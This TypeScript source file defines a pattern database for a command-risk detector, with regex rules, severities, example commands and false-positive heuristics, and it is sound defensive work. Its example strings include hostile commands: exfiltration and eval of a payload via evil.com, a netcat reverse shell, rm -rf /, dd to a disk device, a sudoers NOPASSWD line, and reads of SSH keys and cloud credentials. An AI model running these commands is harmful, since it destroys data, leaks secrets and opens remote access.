/**
 * Security Sandbox Analyzer - Pattern Database
 *
 * A database of 40+ dangerous command patterns with regex matching,
 * categorization, examples, and false-positive hints.
 */

import type { RiskCategory } from "./commandRiskScorer.js";

export interface DangerousPattern {
  id: string;
  pattern: RegExp;
  category: RiskCategory;
  severity: "low" | "medium" | "high" | "critical";
  description: string;
  examples: string[];
  falsePositiveHints: string[];
}

export interface MatchResult {
  pattern: DangerousPattern;
  matched: string;
  isFalsePositive: boolean;
  falsePositiveReason?: string;
}

// ── Built-in patterns ─────────────────────────────────────────────────

function builtinPatterns(): DangerousPattern[] {
  return [
    // ── File Destruction ────────────────────────────────────────────
    {
      id: "fd-001",
      pattern: /\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\s+\/\s*$/,
      category: "file_destruction",
      severity: "critical",
      description: "rm -rf targeting root filesystem",
      examples: ["rm -rf /", "rm -rf / --no-preserve-root"],
      falsePositiveHints: [],
    },
    {
      id: "fd-002",
      pattern: /\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\s+~\/?/,
      category: "file_destruction",
      severity: "critical",
      description: "rm -rf targeting home directory",
      examples: ["rm -rf ~/", "rm -rf ~/Documents"],
      falsePositiveHints: ["rm -rf ~/Downloads/temp is relatively safer"],
    },
    {
      id: "fd-003",
      pattern: /\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\s+\*/,
      category: "file_destruction",
      severity: "high",
      description: "rm -rf with wildcard glob",
      examples: ["rm -rf *", "rm -rf ./*"],
      falsePositiveHints: [
        "May be intentional in build scripts within known directories",
      ],
    },
    {
      id: "fd-004",
      pattern: /\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\s+node_modules/,
      category: "file_destruction",
      severity: "low",
      description: "rm -rf node_modules",
      examples: ["rm -rf node_modules", "rm -rf ./node_modules"],
      falsePositiveHints: [
        "Standard cleanup command in Node.js projects — usually safe",
      ],
    },
    {
      id: "fd-005",
      pattern: /\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\s+(dist|build|out|\.next|\.cache|target|__pycache__)\b/,
      category: "file_destruction",
      severity: "low",
      description: "rm -rf on common build output directories",
      examples: ["rm -rf dist", "rm -rf build", "rm -rf .next"],
      falsePositiveHints: [
        "Standard cleanup of build artifacts — usually safe in project context",
      ],
    },
    {
      id: "fd-006",
      pattern: /\bfind\b.*-delete/,
      category: "file_destruction",
      severity: "high",
      description: "find with -delete flag for bulk removal",
      examples: ["find / -name '*.log' -delete"],
      falsePositiveHints: [
        "find . -name '*.pyc' -delete in project dir is usually safe",
      ],
    },
    {
      id: "fd-007",
      pattern: /\bdd\b.*of=\/dev\//,
      category: "file_destruction",
      severity: "critical",
      description: "dd writing directly to device",
      examples: ["dd if=/dev/zero of=/dev/sda"],
      falsePositiveHints: [],
    },
    {
      id: "fd-008",
      pattern: /\bdd\b.*of=/,
      category: "file_destruction",
      severity: "high",
      description: "dd overwriting file or device",
      examples: ["dd if=image.iso of=disk.img"],
      falsePositiveHints: ["dd for creating disk images is common usage"],
    },
    {
      id: "fd-009",
      pattern: /\bmkfs\b/,
      category: "file_destruction",
      severity: "critical",
      description: "Creating filesystem — destroys existing data",
      examples: ["mkfs.ext4 /dev/sdb1"],
      falsePositiveHints: [],
    },
    {
      id: "fd-010",
      pattern: /\bshred\b/,
      category: "file_destruction",
      severity: "high",
      description: "Secure file shredding — irrecoverable",
      examples: ["shred -u secret.txt"],
      falsePositiveHints: [],
    },
    {
      id: "fd-011",
      pattern: /\btruncate\b/,
      category: "file_destruction",
      severity: "medium",
      description: "File truncation",
      examples: ["truncate -s 0 logfile.log"],
      falsePositiveHints: ["Truncating log files is common maintenance"],
    },
    {
      id: "fd-012",
      pattern: />\s*\/dev\/sd[a-z]/,
      category: "file_destruction",
      severity: "critical",
      description: "Redirecting output to block device",
      examples: ["echo x > /dev/sda"],
      falsePositiveHints: [],
    },

    // ── Data Exfiltration ───────────────────────────────────────────
    {
      id: "de-001",
      pattern: /\bcat\b.*\|\s*(curl|wget)\b/,
      category: "data_exfiltration",
      severity: "critical",
      description: "Piping file content to HTTP client",
      examples: ["cat /etc/passwd | curl -X POST -d @- https://evil.com"],
      falsePositiveHints: [],
    },
    {
      id: "de-002",
      pattern: /\b(curl|wget)\b.*--data.*<\s*\//,
      category: "data_exfiltration",
      severity: "critical",
      description: "HTTP POST with local file as data",
      examples: ["curl --data @/etc/shadow https://evil.com"],
      falsePositiveHints: [],
    },
    {
      id: "de-003",
      pattern: /\bnc\b.*-e\s*\/bin\/(ba)?sh/,
      category: "data_exfiltration",
      severity: "critical",
      description: "Netcat reverse shell",
      examples: ["nc -e /bin/sh 10.0.0.1 4444"],
      falsePositiveHints: [],
    },
    {
      id: "de-004",
      pattern: /\bbase64\b.*\|\s*(curl|wget|nc)\b/,
      category: "data_exfiltration",
      severity: "high",
      description: "Base64 encoding piped to network tool",
      examples: ["cat secret.key | base64 | curl -d @- https://evil.com"],
      falsePositiveHints: [],
    },
    {
      id: "de-005",
      pattern: /\b(dig|nslookup|host)\b.*\$\(/,
      category: "data_exfiltration",
      severity: "high",
      description: "DNS query with command substitution — DNS exfiltration",
      examples: ["dig $(cat /etc/passwd | base64).evil.com"],
      falsePositiveHints: [],
    },

    // ── Privilege Escalation ────────────────────────────────────────
    {
      id: "pe-001",
      pattern: /\bsudo\b/,
      category: "privilege_escalation",
      severity: "high",
      description: "Command with sudo elevation",
      examples: ["sudo rm -rf /var/log", "sudo apt install foo"],
      falsePositiveHints: [
        "sudo apt update/install is common and usually intentional",
      ],
    },
    {
      id: "pe-002",
      pattern: /\bchmod\b.*777/,
      category: "privilege_escalation",
      severity: "high",
      description: "Setting world-readable/writable/executable permissions",
      examples: ["chmod 777 /tmp/script.sh"],
      falsePositiveHints: [],
    },
    {
      id: "pe-003",
      pattern: /\bchmod\b.*\+s/,
      category: "privilege_escalation",
      severity: "critical",
      description: "Setting setuid/setgid bit",
      examples: ["chmod +s /usr/local/bin/app"],
      falsePositiveHints: [],
    },
    {
      id: "pe-004",
      pattern: /\bchown\b.*root/,
      category: "privilege_escalation",
      severity: "high",
      description: "Changing ownership to root",
      examples: ["chown root:root /etc/myconfig"],
      falsePositiveHints: [],
    },
    {
      id: "pe-005",
      pattern: /\bvisudo\b|\/etc\/sudoers/,
      category: "privilege_escalation",
      severity: "critical",
      description: "Modifying sudo configuration",
      examples: ["visudo", "echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"],
      falsePositiveHints: [],
    },

    // ── Network Access ──────────────────────────────────────────────
    {
      id: "na-001",
      pattern: /\bssh\b\s+\w+@/,
      category: "network_access",
      severity: "medium",
      description: "SSH connection to remote host",
      examples: ["ssh user@remote-host", "ssh root@192.168.1.1"],
      falsePositiveHints: ["Legitimate remote administration"],
    },
    {
      id: "na-002",
      pattern: /\bscp\b/,
      category: "network_access",
      severity: "medium",
      description: "Secure file copy over SSH",
      examples: ["scp file.txt user@host:/tmp/"],
      falsePositiveHints: ["Legitimate file transfer"],
    },
    {
      id: "na-003",
      pattern: /\brsync\b.*\w+@\w+:/,
      category: "network_access",
      severity: "medium",
      description: "Rsync to remote host",
      examples: ["rsync -avz ./data user@host:/backup/"],
      falsePositiveHints: ["Backup operations"],
    },
    {
      id: "na-004",
      pattern: /\bnc\b.*-l/,
      category: "network_access",
      severity: "high",
      description: "Netcat listening — potential backdoor",
      examples: ["nc -l -p 4444"],
      falsePositiveHints: ["Local development port testing"],
    },
    {
      id: "na-005",
      pattern: /\bsocat\b/,
      category: "network_access",
      severity: "high",
      description: "Socat socket relay — flexible network tool",
      examples: ["socat TCP-LISTEN:8080,fork TCP:remote:80"],
      falsePositiveHints: [],
    },

    // ── Code Execution ──────────────────────────────────────────────
    {
      id: "ce-001",
      pattern: /\beval\b/,
      category: "code_execution",
      severity: "high",
      description: "Shell eval — arbitrary code execution",
      examples: ['eval "$(curl https://evil.com/payload)"'],
      falsePositiveHints: ['eval "$(ssh-agent -s)" is standard usage'],
    },
    {
      id: "ce-002",
      pattern: /\bpython[23]?\s+-c\b.*\b(socket|subprocess|os\.system|exec|__import__)/,
      category: "code_execution",
      severity: "high",
      description: "Python inline execution with dangerous modules",
      examples: [
        'python -c "import socket; ..."',
        'python3 -c "import subprocess; ..."',
      ],
      falsePositiveHints: [],
    },
    {
      id: "ce-003",
      pattern: /\bnode\s+-e\b.*\b(child_process|exec|spawn)/,
      category: "code_execution",
      severity: "high",
      description: "Node.js inline execution with child_process",
      examples: [
        "node -e \"require('child_process').exec('whoami')\"",
      ],
      falsePositiveHints: [],
    },
    {
      id: "ce-004",
      pattern: /\bperl\s+-e\b/,
      category: "code_execution",
      severity: "medium",
      description: "Perl inline execution",
      examples: ["perl -e 'system(\"ls\")'"],
      falsePositiveHints: ["Perl one-liners for text processing are common"],
    },
    {
      id: "ce-005",
      pattern: /\bruby\s+-e\b/,
      category: "code_execution",
      severity: "medium",
      description: "Ruby inline execution",
      examples: ["ruby -e 'system(\"ls\")'"],
      falsePositiveHints: ["Ruby one-liners for scripting are common"],
    },

    // ── Environment Modification ────────────────────────────────────
    {
      id: "em-001",
      pattern: /\bexport\b.*(API_KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)/i,
      category: "environment_modification",
      severity: "high",
      description: "Exporting sensitive environment variable",
      examples: ["export API_KEY=sk-xxx", "export AWS_SECRET_ACCESS_KEY=xxx"],
      falsePositiveHints: [],
    },
    {
      id: "em-002",
      pattern: />>?\s*~?\/?.*\.(bashrc|bash_profile|profile|zshrc)/,
      category: "environment_modification",
      severity: "high",
      description: "Writing to shell profile file",
      examples: ["echo 'export PATH=...' >> ~/.bashrc"],
      falsePositiveHints: ["Legitimate PATH additions by installers"],
    },
    {
      id: "em-003",
      pattern: /\bLD_PRELOAD\b/,
      category: "environment_modification",
      severity: "critical",
      description: "LD_PRELOAD — shared library injection",
      examples: ["LD_PRELOAD=./evil.so /usr/bin/app"],
      falsePositiveHints: [],
    },
    {
      id: "em-004",
      pattern: /\bcrontab\b/,
      category: "environment_modification",
      severity: "high",
      description: "Crontab modification — persistent scheduled task",
      examples: ["crontab -e", "(crontab -l; echo '* * * * * cmd') | crontab -"],
      falsePositiveHints: ["crontab -l (listing) is read-only"],
    },
    {
      id: "em-005",
      pattern: /\bsystemctl\s+(enable|start|restart)\b/,
      category: "environment_modification",
      severity: "medium",
      description: "Systemd service management",
      examples: ["systemctl enable myservice", "systemctl restart nginx"],
      falsePositiveHints: ["Normal server administration"],
    },

    // ── Supply Chain ────────────────────────────────────────────────
    {
      id: "sc-001",
      pattern: /\b(curl|wget)\b.*\|\s*(ba)?sh\b/,
      category: "supply_chain",
      severity: "critical",
      description: "Piping remote content directly to shell",
      examples: [
        "curl https://example.com/install.sh | bash",
        "wget -qO- https://example.com/setup | sh",
      ],
      falsePositiveHints: [
        "Some legitimate installers use this pattern (nvm, rustup) but it is still risky",
      ],
    },
    {
      id: "sc-002",
      pattern: /\bnpm\s+install\s+[^-\s]/,
      category: "supply_chain",
      severity: "medium",
      description: "Installing specific npm package",
      examples: ["npm install lodash", "npm install unknown-pkg"],
      falsePositiveHints: [
        "Well-known packages from trusted maintainers are lower risk",
      ],
    },
    {
      id: "sc-003",
      pattern: /\bpip3?\s+install\b.*https?:/,
      category: "supply_chain",
      severity: "high",
      description: "pip install from URL",
      examples: ["pip install https://evil.com/package.tar.gz"],
      falsePositiveHints: [],
    },
    {
      id: "sc-004",
      pattern: /\bpip3?\s+install\b/,
      category: "supply_chain",
      severity: "medium",
      description: "pip install from PyPI",
      examples: ["pip install requests", "pip3 install numpy"],
      falsePositiveHints: [
        "Well-known packages (requests, numpy, flask) are lower risk",
      ],
    },
    {
      id: "sc-005",
      pattern: /\bnpx\s+[^@\s]+/,
      category: "supply_chain",
      severity: "medium",
      description: "npx executing package — may download and run arbitrary code",
      examples: ["npx some-generator", "npx create-react-app"],
      falsePositiveHints: [
        "Well-known create-* generators are standard",
      ],
    },

    // ── Information Disclosure ───────────────────────────────────────
    {
      id: "id-001",
      pattern: /\bcat\b.*\/etc\/(passwd|shadow)/,
      category: "information_disclosure",
      severity: "high",
      description: "Reading system user/password database",
      examples: ["cat /etc/passwd", "cat /etc/shadow"],
      falsePositiveHints: ["Reading /etc/passwd for user lookup is common"],
    },
    {
      id: "id-002",
      pattern: /\bcat\b.*\.ssh\/(id_rsa|id_ed25519|id_ecdsa)/,
      category: "information_disclosure",
      severity: "critical",
      description: "Reading SSH private keys",
      examples: ["cat ~/.ssh/id_rsa"],
      falsePositiveHints: [],
    },
    {
      id: "id-003",
      pattern: /\bcat\b.*\.(aws\/credentials|config\/gcloud)/,
      category: "information_disclosure",
      severity: "critical",
      description: "Reading cloud provider credentials",
      examples: ["cat ~/.aws/credentials", "cat ~/.config/gcloud/credentials.db"],
      falsePositiveHints: [],
    },
    {
      id: "id-004",
      pattern: /\bcat\b.*\.env\b/,
      category: "information_disclosure",
      severity: "high",
      description: "Reading .env file",
      examples: ["cat .env", "cat .env.production"],
      falsePositiveHints: [
        ".env.example files typically do not contain real secrets",
      ],
    },
    {
      id: "id-005",
      pattern: /\b(printenv|env)\b/,
      category: "information_disclosure",
      severity: "medium",
      description: "Dumping all environment variables",
      examples: ["env", "printenv"],
      falsePositiveHints: [
        "env VAR=val command (setting vars) is different from dumping",
      ],
    },
    {
      id: "id-006",
      pattern: /\bhistory\b/,
      category: "information_disclosure",
      severity: "medium",
      description: "Reading shell command history",
      examples: ["history", "cat ~/.bash_history"],
      falsePositiveHints: ["history | grep pattern for finding previous commands"],
    },
  ];
}

// ── PatternDatabase ───────────────────────────────────────────────────

export class PatternDatabase {
  private patterns: Map<string, DangerousPattern> = new Map();

  constructor() {
    for (const p of builtinPatterns()) {
      this.patterns.set(p.id, p);
    }
  }

  /**
   * Match a command against all patterns and return results.
   */
  match(command: string): MatchResult[] {
    const results: MatchResult[] = [];
    const trimmed = command.trim();

    for (const pattern of this.patterns.values()) {
      const m = trimmed.match(pattern.pattern);
      if (m) {
        const fp = this.checkFalsePositive(trimmed, pattern);
        results.push({
          pattern,
          matched: m[0],
          isFalsePositive: fp.isFP,
          falsePositiveReason: fp.reason,
        });
      }
    }

    return results;
  }

  /**
   * Add a new pattern to the database.
   */
  addPattern(pattern: DangerousPattern): void {
    this.patterns.set(pattern.id, pattern);
  }

  /**
   * Remove a pattern by id.
   */
  removePattern(id: string): boolean {
    return this.patterns.delete(id);
  }

  /**
   * Get all patterns, optionally filtered by category.
   */
  getPatterns(category?: RiskCategory): DangerousPattern[] {
    const all = [...this.patterns.values()];
    if (category) {
      return all.filter((p) => p.category === category);
    }
    return all;
  }

  /**
   * Get the count of loaded patterns.
   */
  get size(): number {
    return this.patterns.size;
  }

  // ── False positive heuristics ───────────────────────────────────

  private checkFalsePositive(
    command: string,
    pattern: DangerousPattern
  ): { isFP: boolean; reason?: string } {
    // Specific false positive rules
    if (
      pattern.id === "fd-004" ||
      pattern.id === "fd-005"
    ) {
      // rm -rf node_modules / build dirs are almost always safe
      return {
        isFP: true,
        reason: "Removing standard build/dependency directories is routine cleanup",
      };
    }

    if (pattern.id === "id-005" && /\benv\b\s+\w+=/.test(command)) {
      return {
        isFP: true,
        reason: "Using env to set variables for a subprocess, not dumping environment",
      };
    }

    if (pattern.id === "em-004" && /\bcrontab\s+-l\b/.test(command)) {
      return {
        isFP: true,
        reason: "crontab -l is read-only listing",
      };
    }

    if (pattern.id === "ce-001" && /\beval\b.*\bssh-agent\b/.test(command)) {
      return {
        isFP: true,
        reason: 'eval "$(ssh-agent -s)" is standard SSH agent initialization',
      };
    }

    if (pattern.id === "pe-001" && /\bsudo\s+(apt|apt-get|yum|dnf|pacman|brew)\b/.test(command)) {
      return {
        isFP: false,
        reason: "Package manager with sudo is common but still elevated privileges",
      };
    }

    return { isFP: false };
  }
}
